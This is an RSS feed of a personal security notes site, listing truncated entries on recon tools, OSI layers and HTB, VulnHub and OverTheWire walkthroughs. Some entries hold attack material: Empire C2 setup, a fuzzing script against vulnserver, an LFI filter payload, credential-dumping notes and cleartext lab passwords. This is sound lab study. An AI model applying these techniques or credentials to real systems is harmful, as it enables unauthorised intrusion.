verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn't use this option) -h: use SHODAN database to query discovered hosts Examples Scan domain on google theHarvester -d justin-p.</description></item><item><title>PSDNSDumpsterAPI</title><link>https://notes.justin-p.me/cheatsheets/tools/psdnsdumpsterapi/</link><pubDate>Wed, 11 Mar 2020 15:16:39 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/psdnsdumpsterapi/</guid><description>PSDNSDumpsterAPI Installation Install-Module PSDNSDumpsterAPI Usage Invoke-PSDNSDumpsterAPI -Domain 'domain.tld' Flags .PARAMETER Domains One or more domains to get DNSDumpster results for. Examples Return the results from dnsdumpster as a PSObject $DomainInfo=Invoke-PSDnsDumpsterAPI -Domains 'justin-p.me' Also see Github</description></item><item><title>sublist3r</title><link>https://notes.justin-p.me/cheatsheets/tools/sublist3r/</link><pubDate>Wed, 11 Mar 2020 15:15:29 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/sublist3r/</guid><description>Sublist3r Installation Usage Flags Examples Enumerate subdomains of specific domain sublist3r -d example.com Show only subdomains which have ports 80 and 443 open sublist3r -d example.com -p 80,443 Save results in txt file sublist3r -d example.com -o ~/output/file.txt Also see Github</description></item><item><title>h8mail</title><link>https://notes.justin-p.me/cheatsheets/tools/h8mail/</link><pubDate>Wed, 11 Mar 2020 11:56:31 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/h8mail/</guid><description>h8mail h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt&amp;rsquo;s &amp;ldquo;Collection1&amp;rdquo; and the infamous &amp;ldquo;Breach Compilation&amp;rdquo; torrent.
Installation pip3 install h8mail Usage usage: h8mail [-h] [-t USER_TARGETS [USER_TARGETS ...]] [-u USER_URLS [USER_URLS ...]] [-q USER_QUERY] [--loose] [-c CONFIG_FILE [CONFIG_FILE ...]] [-o OUTPUT_FILE] [-bc BC_PATH] [-sk] [-k CLI_APIKEYS [CLI_APIKEYS ...]] [-lb LOCAL_BREACH_SRC [LOCAL_BREACH_SRC ...]] [-gz LOCAL_GZIP_SRC [LOCAL_GZIP_SRC .</description></item><item><title>Layer 4</title><link>https://notes.justin-p.me/notes/networking/osi-model/layer4/</link><pubDate>Wed, 11 Mar 2020 11:11:28 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/osi-model/layer4/</guid><description>Layer 4 TCP Transmission Control Protocol (TCP) is one of the main protocols of the &amp;lsquo;Internet protocol suite&amp;rsquo;.
TCP provides reliable, ordered, and error-checked delivery of a stream of octets (bytes) between applications running on hosts communicating via an IP network. Major internet applications such as the HTTP, SMTP, SSH, and SFTP rely on TCP. SSL/TLS often runs on top of TCP.
TCP is connection-oriented. A connection between client and server is established before data can be sent, this connection establisment is called the Three-way handshake.</description></item><item><title>Empire</title><link>https://notes.justin-p.me/cheatsheets/tools/empire/</link><pubDate>Wed, 11 Mar 2020 10:40:17 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/tools/empire/</guid><description>Empire Install System git clone --recursive https://github.com/BC-SECURITY/Empire.git cd Empire sudo ./setup/install.sh sudo poetry install Docker # Pull the latest image docker pull bcsecurity/empire:latest â€‹ # Run the server with the rest api and socket ports open docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest â€‹ # Run the client docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest client â€‹ # To run the client against the already running server container docker container ls docker exec -it {container-id} .</description></item><item><title>Vulnix</title><link>https://notes.justin-p.me/notes/ctfs/vulnhub/vulnix/</link><pubDate>Tue, 10 Mar 2020 17:33:34 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnhub/vulnix/</guid><description>vulnix Proto port Service/URL Info Potential Vulns Verified Vulns where you at root@kali:~/Documents/vulnix# nmap -sn -PR 192.168.88.128/24 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 16:35 CET Nmap scan report for 192.168.88.2 Host is up (0.00018s latency). MAC Address: 00:50:56:FE:4E:C1 (VMware) Nmap scan report for 192.168.88.134 Host is up (0.00099s latency). MAC Address: 00:0C:29:76:09:06 (VMware) Nmap scan report for 192.168.88.254 Host is up (0.00062s latency).</description></item><item><title>Fristileaks</title><link>https://notes.justin-p.me/notes/ctfs/vulnhub/fristileaks/</link><pubDate>Tue, 10 Mar 2020 17:25:28 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnhub/fristileaks/</guid><description>fristileaks Proto port Service/URL Info Potential Vulns Verified Vulns where you at nmap -sn -PR 192.168.88.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 23:39 CET Nmap scan report for 192.168.88.2 Host is up (0.00052s latency). MAC Address: 00:50:56:FE:4E:C1 (VMware) Nmap scan report for 192.168.88.133 Host is up (0.00067s latency). MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC) Nmap scan report for 192.168.88.254 Host is up (0.</description></item><item><title>Bash</title><link>https://notes.justin-p.me/cheatsheets/programming/bash/</link><pubDate>Tue, 10 Mar 2020 16:43:50 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/programming/bash/</guid><description>Bash Getting started Example #!/usr/bin/env bash NAME=&amp;quot;John&amp;quot; echo &amp;quot;Hello $NAME!&amp;quot; Variables NAME=&amp;quot;John&amp;quot; echo $NAME echo &amp;quot;$NAME&amp;quot; echo &amp;quot;${NAME}!&amp;quot; String quotes NAME=&amp;quot;John&amp;quot; echo &amp;quot;Hi $NAME&amp;quot; #=&amp;gt; Hi John echo 'Hi $NAME' #=&amp;gt; Hi $NAME Shell execution echo &amp;quot;I'm in $(pwd)&amp;quot; echo &amp;quot;I'm in `pwd`&amp;quot; # Same See Command substitution
Conditional execution git commit &amp;amp;&amp;amp; git push git commit || echo &amp;quot;Commit failed&amp;quot; Function get_name() { echo &amp;quot;John&amp;quot; } echo &amp;quot;You are $(get_name)&amp;quot; Conditional if [[ -z &amp;quot;$string&amp;quot; ]]; then echo &amp;quot;String is empty&amp;quot; elif [[ -n &amp;quot;$string&amp;quot; ]]; then echo &amp;quot;String is not empty&amp;quot; fi Strict mode set -euo pipefail IFS=$'\n\t' See: Unofficial bash strict mode</description></item><item><title>Markdown</title><link>https://notes.justin-p.me/cheatsheets/programming/markdown/</link><pubDate>Tue, 10 Mar 2020 16:43:50 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/programming/markdown/</guid><description>Markdown Headers # h1 ## h2 ### h3 Header 1 ======== Header 2 -------- Emphasis *italic* _italic_ **bold** __bold__ `code` Lists * Item 1 * Item 2 - Item 1 - Item 2 Links [link](http://google.com) [link][google] &amp;lt;http://google.com&amp;gt; Images ![Image alt text](/path/to/img.jpg) ![Image alt text](/path/to/img.jpg &amp;quot;title&amp;quot;) ![Image alt text][img] Code 4 space indent makes a code block code fences ```js codeFences.</description></item><item><title>Layer 5</title><link>https://notes.justin-p.me/notes/networking/osi-model/layer5/</link><pubDate>Tue, 10 Mar 2020 16:43:49 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/osi-model/layer5/</guid><description>Layer 5 Num 5 Name Session Acronim Sausage PDU What is &amp;lsquo;on it&amp;rsquo; Session management (sockets) Function Managing communication sessions, i.e. continuous exchange of information in the form of multiple back-and-forth transmissions between two nodes This layer is responsible for establishment of connection, maintenance of sessions, authentication and also ensures security.</description></item><item><title>Layer 6</title><link>https://notes.justin-p.me/notes/networking/osi-model/layer6/</link><pubDate>Tue, 10 Mar 2020 16:43:49 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/osi-model/layer6/</guid><description>Layer 6 Num 6 Name Presentation Acronim Pizza PDU Data What is &amp;lsquo;on it&amp;rsquo; AVI, GIF ,JPEG, MKV Function Translation of data between a networking service and an application; including character encoding, data Presentation layer is also called the Translation layer. The data from the application layer is extracted here and manipulated as per the required format to transmit over the network.</description></item><item><title>MySQL</title><link>https://notes.justin-p.me/cheatsheets/programming/mysql/</link><pubDate>Tue, 10 Mar 2020 16:43:49 +0100</pubDate><guid>https://notes.justin-p.me/cheatsheets/programming/mysql/</guid><description>MySQL Create / Delete Database CREATE DATABASE dbNameYouWant CREATE DATABASE dbNameYouWant CHARACTER SET utf8 DROP DATABASE dbNameYouWant ALTER DATABASE dbNameYouWant CHARACTER SET utf8 Backup Database to SQL File mysqldump -u Username -p dbNameYouWant &amp;gt; databasename_backup.sql Restore from backup SQL File mysql - u Username -p dbNameYouWant &amp;lt; databasename_backup.sql Repair Tables After Unclean Shutdown mysqlcheck --all-databases mysqlcheck --all-databases --fast Browsing SHOW DATABASES SHOW TABLES SHOW FIELDS FROM table / DESCRIBE table SHOW CREATE TABLE table SHOW PROCESSLIST KILL process_number Insert INSERT INTO table1 (field1, field2, .</description></item><item><title>Bandit</title><link>https://notes.justin-p.me/notes/ctfs/overthewire/bandit/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/overthewire/bandit/</guid><description>bandit Bandit0 bandit0@bandit$ ls readme bandit0@bandit$ cat readme boJ9jbbUNNfktd78OOpsqOltutMc3MY1 bandit0@bandit$ exit logout Connection to bandit.labs.overthewire.org closed. bandit1 bandit1@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no bandit1@bandit$ ls - bandit1@bandit$ cat ./- CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 bandit1@bandit$ logout Connection to bandit.labs.overthewire.org closed. bandit2 bandit2@bandit.labs.overthewire.org -p 2220 -PubkeyAuthentication no This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit2@bandit.labs.overthewire.orgs password: bandit2@bandit $ ls spaces in this filename bandit2@bandit $ cat spaces\ in\ this\ filename UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit2@bandit $ logout Connection to bandit.</description></item><item><title>Layer 1</title><link>https://notes.justin-p.me/notes/networking/osi-model/layer1/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/osi-model/layer1/</guid><description>Layer 1 Num 1 Name Physical Layer Acronim Please PDU Bit What is &amp;lsquo;on it&amp;rsquo; Data cables (CAT5e, CAT6), Terminations (RJ45,SFP), Hub, Repeater, Modem Function Transmission and reception of raw bit streams over a physical medium The lowest layer of the OSI reference model is the physical layer. It is responsible for the actual physical connection between the devices.</description></item><item><title>Layer 2</title><link>https://notes.justin-p.me/notes/networking/osi-model/layer2/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/osi-model/layer2/</guid><description>Layer 2 Num 2 Name Data link Acronim Do PDU Frame What is &amp;lsquo;on it&amp;rsquo; NIC, Switch, Bridge Function Reliable transmission of data frames between two nodes connected by a physical layer The data link layer is responsible for the node to node delivery of the message. The main function of this layer is to make sure data transfer is error free from one node to another, over the physical layer.</description></item><item><title>Layer 7</title><link>https://notes.justin-p.me/notes/networking/osi-model/layer7/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/osi-model/layer7/</guid><description>Layer7 Num 7 Name Application Acronim Away PDU What is &amp;lsquo;on it&amp;rsquo; HTTP, SMTP, SMB Function High-level APIs, including resource sharing, remote file access At the very top of the OSI Reference Model stack of layers, we find Application layer which is implemented by the network applications. These applications produce the data, which has to be transferred over the network.</description></item><item><title>Legacy</title><link>https://notes.justin-p.me/notes/ctfs/htb/legacy/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/legacy/</guid><description>legacy where you at 10.10.10.4
what you got nmap Related files full_tcp.gnmap (0 kb) full_tcp.nmap (2 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (2 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) tcp_vuln.gnmap (0 kb) tcp_vuln.nmap (0 kb) # Nmap 7.80 scan initiated Thu Jan 23 14:44:54 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/legacy/scans/full_tcp.</description></item><item><title>Level 1</title><link>https://notes.justin-p.me/notes/ctfs/vulnhub/kioptrix/level1/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnhub/kioptrix/level1/</guid><description>level1 Proto port Service/URL Info Potential Vulns Verified Vulns TCP 22 SSH OpenSSH 2.9p2 (protocol 1.99) ssh-hostkey 1024 Server supports SSHv1 old key exchange / ciphers : DH SHA1/AES128-CBC Off-By-One Kerberos 4 TGT/AFS Token Buffer Overflow TCP 80,443 HTTP/S Apache httpd 1.3.20 PHP (4?) Unix Red-Hat/Linux mod_ssl/2.8.4 OpenSSL/0.9.6b SSLv2 Allowed methods: GET, HEAD, OPTIONS, TRACE No security headers configured HTTP-Title: Test Page for the Apache Web Server on Red Hat Linux Webalizer Version 2.</description></item><item><title>Level 2</title><link>https://notes.justin-p.me/notes/ctfs/vulnhub/kioptrix/level2/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnhub/kioptrix/level2/</guid><description>level2 Proto port Service/URL Info Potential Vulns Verified Vulns system CentOS 4.5 Linux 2.6.9-55.EL i686 &amp;lsquo;ip_append_data()&amp;rsquo; Ring0 Privilege Escalation (1) &amp;lsquo;sock_sendpage()&amp;rsquo; Local Privilege Escalation &amp;lsquo;sock_sendpage()&amp;rsquo; TCP 22 SSH OpenSSH 3.9p1 (protocol 1.99) TCP 80,443 HTTP/S Apache httpd 2.0.52 (EOL) no secuirty headers Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE CentOS 4.5 Linux 2.6.9-55.EL i686 PHP/4.</description></item><item><title>Level 3</title><link>https://notes.justin-p.me/notes/ctfs/vulnhub/kioptrix/level3/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnhub/kioptrix/level3/</guid><description>level3 Proto port Service/URL Info Potential Vulns Verified Vulns system Ubuntu 8.04.3 LTS Linux kernel 2.6.24-24 dreg:Mast3r loneferret:starwars vmsplice&amp;rsquo; Local Privilege Escalation (1) SCTP FWD Memory Corruption Remote Overflow TCP 22 SSH OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) TCP 80 HTTP Apache/2.2.8 (Ubuntu) (EOL) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch (outdated) HTTP TRACE method is active TCP 80 http://kioptrix3.</description></item><item><title>Level 4</title><link>https://notes.justin-p.me/notes/ctfs/vulnhub/kioptrix/level4/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnhub/kioptrix/level4/</guid><description>level4 Proto port Service/URL Info Potential Vulns Verified Vulns system Ubuntu 8.04.3 LTS Linux 2.6.24-24 Workgroup: WORKGROUP Domain: localdomain FQDN: Kioptrix4.localdomain Account Lockout Threshold: None Users: nobody,robert,root,john,loneferret dirty cow dirty cow TCP 22 ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) TCP 80 http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) UDP 137 netbios-ns Microsoft Windows netbios-ns (workgroup: WORKGROUP) TCP 139 netbios-ssn Samba smbd 3.</description></item><item><title>Natasa</title><link>https://notes.justin-p.me/notes/ctfs/overthewire/natasa/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/overthewire/natasa/</guid><description>natasa Natas0 view-source:http://natas0.natas.labs.overthewire.org/ the password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto Natas1 view-source:http://natas1.natas.labs.overthewire.org/ the password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi Natas2 view-source:http://natas2.natas.labs.overthewire.org/files/pixel.png http://natas2.natas.labs.overthewire.org/files/ http://natas2.natas.labs.overthewire.org/files/users.txt # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 eve:zo4mJWyNj2 mallory:9urtcpzBmH natas 3 http://natas3.natas.labs.overthewire.org/robots.txt http://natas3.natas.labs.overthewire.org/s3cr3t/ http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ Natas 4 Access disallowed. You are visiting from &amp;quot;&amp;quot; while authorized users should come only from &amp;ldquo;http://natas5.natas.labs.overthewire.org/&amp;rdquo;
F12 -&amp;gt; network -&amp;gt; reload page -&amp;gt; edit headers Add following Referer: http://natas5.natas.labs.overthewire.org/ resend Access granted.</description></item><item><title>Packettracer</title><link>https://notes.justin-p.me/notes/networking/packettracer/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/packettracer/</guid><description>Packettracer See github.</description></item><item><title>Pwnlab</title><link>https://notes.justin-p.me/notes/ctfs/vulnhub/pwnlab/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnhub/pwnlab/</guid><description>pwnlab Info overview Machine IP Hostname workgroup OS 192.168.56.103 Ports and services port Service/URL Info 80/tcp http apache 2.4.10 some 5.X version of PHP dir listing images/ upload/ LFI on page param php://filter/convert.base64-encode/resource application stores passwords in base64. see login.php 68/udp dhcpc 111/tcp rpcbind 111/udp rpcbinv 3306/tcp MariaDB (mysql) 5.</description></item><item><title>Stapler</title><link>https://notes.justin-p.me/notes/ctfs/vulnhub/stapler/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnhub/stapler/</guid><description>stapler Info overview Machine Hostname workgroup OS RED WORKGROUP Ports and services port Service/URL Info 20,21/tcp ftp vsftpd 2.0.8 or later (vsFTPd 3.0.3 ?) Anonymous FTP login allowed 22/tcp ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 53/tcp&amp;amp;udp dns dnsmasq-2.75 69/udp tftp tftp 80/tcp http PHP cli server 5.</description></item><item><title>TCP/IP Model</title><link>https://notes.justin-p.me/notes/networking/tcpip-model/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/networking/tcpip-model/</guid><description>TCP/IP model Layer Number Layer Name Protocol Protocol Data Unit Addressing 5 Application HTTP, SMB, SMTP, etc Messages n/a 4 Transport TCP/UDP Segment Ports 3 Network IP Datagram IP Address 2 Data Link Ethernet, Wi-Fi Frames MAC Address 1 Physical 10 Base T, 802.11 Bits n/a</description></item><item><title>TRUN</title><link>https://notes.justin-p.me/notes/ctfs/vulnserver/trun/</link><pubDate>Tue, 10 Mar 2020 16:43:48 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/vulnserver/trun/</guid><description>trun Fuzzing #!/usr/bin/python import socket,sys from time import sleep ## Fuzzing address = '192.168.136.130' port = 9999 offset = 100 while True: try: buffer = b&amp;quot;&amp;quot; # empty byte var buffer += b&amp;quot;A&amp;quot;*offset # junk times offset print(f'[+] Sending buffer: {str(len(buffer))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b&amp;quot;TRUN /.:/%s \r\n&amp;quot; % buffer) offset += 100 sleep(1) except RuntimeError as Err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.</description></item><item><title>Bashed</title><link>https://notes.justin-p.me/notes/ctfs/htb/bashed/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/bashed/</guid><description>bashed where you at 10.10.10.68
what you got nmap Related files full_tcp.gnmap (0 kb) full_tcp.nmap (1 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (1 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) Nikto Related files nikto.txt (1 kb) Gobuster Related files gobuster_dir_med-txt-html.</description></item><item><title>Blue</title><link>https://notes.justin-p.me/notes/ctfs/htb/blue/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/blue/</guid><description>blue where you at 10.10.10.40
what you got nmap Related files full_tcp.gnmap (0 kb) full_tcp.nmap (3 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (2 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) # Nmap 7.80 scan initiated Thu Jan 23 16:56:13 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/blue/scans/full_tcp.</description></item><item><title>Challanges</title><link>https://notes.justin-p.me/notes/ctfs/graficomspoorzoeker/challanges/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/graficomspoorzoeker/challanges/</guid><description>Challanges 0/4 Wat een ROT ding: uggcf://cnfgrova.pbz/enj/a38UseHF
50 65 72 64 6f 6b 27 73 20 73 70 6f 6f 72 7a 6f 65 6b 65 72 20 21 54 68 69 6e 67 73 20 61 72 65 20 6e 6f 74 20 61 73 20 74 68 65 79 20 73 65 65 6d 2c 20 73 6f 20 49 20 77 69 6c 6c 20 62 72 69 6e 67 20 79 6f 75 20 75 70 20 74 6f 20 73 70 65 65 64 2e 0a 4d 69 72 72 6f 72 20 74 68 65 20 42 61 73 65 20 61 6e 64 20 79 6f 75 20 77 69 6c 6c 20 73 75 63 63 65 65 64 2e 20 1/4 c2l0YXJH</description></item><item><title>credentialaccess</title><link>https://notes.justin-p.me/notes/methodology/internal/active-directory/credential-access/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/internal/active-directory/credential-access/</guid><description>Dumping Delegated Default Kerberos and NTLM Credentials w/o Touching LSASS This is possible due to Active Directory feature called Credentials Delegation.
Credential Delegation Credential Delegation is a feature that allows domain administartors to authorize certain machines or to be more precise - certain SPNs, to accept delegated passwords. In other words, this means that certain services on certain machines can be set to allow users to authenticate without the need to supply their credentials interactively - almost like a Single Sign On.</description></item><item><title>Devel</title><link>https://notes.justin-p.me/notes/ctfs/htb/devel/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/devel/</guid><description>devel where you at 10.10.10.5
what you got nmap Related files full_tcp.gnmap (0 kb) full_tcp.nmap (2 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (2 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) # Nmap 7.80 scan initiated Thu Jan 23 19:06:09 2020 as: nmap -oX - -A -T4 -oN /mnt/hgfs/_shared_folder/htb/boxes/devel/scans/simple_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/devel/scans/simple_tcp.</description></item><item><title>encrypted password protected pdf</title><link>https://notes.justin-p.me/notes/methodology/general/crack-password-encrypted-pdf/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/methodology/general/crack-password-encrypted-pdf/</guid><description>encrypted password protected pdf During your work you might stumble upon an password protected PDF. It&amp;rsquo;s possible to extract a password hash that can be cracked with hashcat.
source
pdfid check if pdf is encrypted (/Encrypt)
root@kali:/mnt/hgfs/_shared_folder# pdfid -n &amp;quot;0ld is g0ld.pdf&amp;quot; PDFiD 0.2.7 0ld is g0ld.pdf PDF Header: %PDF-1.6 obj 15 endobj 15 stream 5 endstream 5 xref 2 trailer 2 startxref 2 /Page 1 /Encrypt 2 /ObjStm 1 pdf-parser Where is /Encrypt (object 43)</description></item><item><title>Grandpa</title><link>https://notes.justin-p.me/notes/ctfs/htb/grandpa/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/grandpa/</guid><description>grandpa where you at 10.10.10.14
nmap Related files full_tcp.gnmap (0 kb) full_tcp.nmap (2 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (2 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) Gobuster Related files gobuster_dir_med-txt-html.txt (0 kb) Nikto Related files nikto.</description></item><item><title>Granny</title><link>https://notes.justin-p.me/notes/ctfs/htb/granny/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/granny/</guid><description>granny where you at 10.10.10.15
nmap Related files full_tcp.gnmap (0 kb) full_tcp.nmap (2 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (2 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) Gobuster Related files gobuster_dir_med-txt-html.txt (0 kb) Nikto Related files nikto.</description></item><item><title>Jerry</title><link>https://notes.justin-p.me/notes/ctfs/htb/jerry/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/jerry/</guid><description>Jerry where you at 10.10.10.95
what you got nmap Related files full_tcp.gnmap (0 kb) full_tcp.nmap (1 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (1 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) # Nmap 7.80 scan initiated Thu Jan 23 21:59:39 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/Jerry/scans/full_tcp.</description></item><item><title>Lame</title><link>https://notes.justin-p.me/notes/ctfs/htb/lame/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/lame/</guid><description>lame where you at 10.10.10.3
what you got # Nmap 7.60 scan initiated Wed Jan 22 15:42:48 2020 as: nmap -oX - -sS -T4 -oN /home/justin-p/Documents/htb/Lame/scans/simple_tcp.nmap -oG /home/justin-p/Documents/htb/Lame/scans/simple_tcp.gnmap 10.10.10.3 Nmap scan report for 10.10.10.3 Host is up (0.028s latency). Not shown: 996 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds # Nmap done at Wed Jan 22 15:42:58 2020 -- 1 IP address (1 host up) scanned in 10.</description></item><item><title>Netmon</title><link>https://notes.justin-p.me/notes/ctfs/htb/metmon/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/metmon/</guid><description>Netmon Where you at 10.10.10.152
What you got Related files full_tcp.gnmap (1 kb) full_tcp.nmap (3 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (2 kb) simple_udp.gnmap (1 kb) simple_udp.nmap (1 kb) PRTG Network Monitor 18.1.37.13946
PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) root@kali:/mnt/hgfs/_shared_folder/htb/boxes/Netmon# pftp 10.</description></item><item><title>Nibbles</title><link>https://notes.justin-p.me/notes/ctfs/htb/nibbles/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/nibbles/</guid><description>Nibbles where you at 10.10.10.75
what you got Related files full_tcp.gnmap (0 kb) full_tcp.nmap (1 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (2 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) Related files gobuster_dir_med-txt-html.txt (0 kb) Related files nikto.</description></item><item><title>Optimum</title><link>https://notes.justin-p.me/notes/ctfs/htb/optimum/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/htb/optimum/</guid><description>optimum where you at 10.10.10.8
what you got Related files full_tcp.gnmap (0 kb) full_tcp.nmap (1 kb) simple_tcp.gnmap (0 kb) simple_tcp.nmap (1 kb) simple_udp.gnmap (0 kb) simple_udp.nmap (0 kb) # Nmap 7.80 scan initiated Fri Jan 24 15:18:36 2020 as: nmap -oX - -A -T4 -p- -oN /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/full_tcp.nmap -oG /mnt/hgfs/_shared_folder/htb/boxes/Optimum/scans/full_tcp.</description></item><item><title>Solutions</title><link>https://notes.justin-p.me/notes/ctfs/graficomspoorzoeker/solutions/</link><pubDate>Tue, 10 Mar 2020 16:43:47 +0100</pubDate><guid>https://notes.justin-p.me/notes/ctfs/graficomspoorzoeker/solutions/</guid><description>0/4 ROT13
https://pastebin.com/raw/n38HfrUS
HEX to ASCII
